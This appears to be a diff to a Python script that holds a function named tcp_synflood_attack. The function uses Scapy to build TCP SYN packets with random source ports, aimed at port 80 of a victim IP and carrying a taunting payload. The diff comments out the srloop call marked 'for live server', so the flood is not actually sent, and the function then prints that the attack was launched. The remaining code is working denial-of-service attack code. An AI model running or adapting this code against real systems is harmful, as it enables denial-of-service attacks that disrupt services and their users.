@@ -114,7 +114,7 @@ def tcp_synflood_attack():
 	num_packets = get_packetCount_send()
 	syn_flood = IP(dst = victim_ip)/TCP(sport=RandShort(), dport= [80], seq=12345,ack=1000,window=1000,flags="S")/"Flooding you rn xD"
 	
-	ans,unans = srloop(syn_flood, inter=0.3, retry=1, timeout=4, count=num_packets)		#For live server
+	# ans,unans = srloop(syn_flood, inter=0.3, retry=1, timeout=4, count=num_packets)		#For live server
 	# send(syn_flood, count = num_packets)		#Not live/ understand RST flag
 	
 	print("\nTCP SYN flood attack launched successfully.")
